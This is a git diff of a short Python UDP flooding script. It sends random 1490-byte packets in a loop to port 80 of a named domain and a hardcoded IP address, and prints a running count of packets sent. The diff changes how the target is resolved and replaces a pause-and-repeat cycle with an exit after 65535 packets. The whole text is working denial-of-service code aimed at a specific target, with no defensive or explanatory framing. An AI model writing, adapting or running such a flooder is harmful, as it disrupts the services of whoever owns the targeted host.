@@ -15,8 +15,7 @@ bytes = random._urandom(1490)
 
 # Get ip.
 url = "fwe22.top"
-#ip = socket.gethostbyname(url)
-ip = "103.215.51.91"
+ip = socket.gethostbyname(url)
 
 # Value.
 sent = 1
@@ -27,13 +26,9 @@ port = 80
 if i == 1:
     try:
         while True:
-            if i == 65535:                
-                i = 1
-                #ip = socket.gethostbyname(url)
-                timeR = random.randint(60,600)
-                print('\033[1;36m/wait %s'%(timeR))
-                time.sleep(timeR)
-            
+            if i == 65535:
+                exit()
+
             sock.sendto(bytes, (str(ip), port))
             sent += 1
             i += 1
@@ -42,4 +37,4 @@ if i == 1:
             print('\033[32;1m[%s]Sented %s packets to %s through port:%s\033[0m'%(dtime, sent, ip, port))  
             
     except:
-        print('\n\033[31;1mExited\033[0m')
+        print('Exited')
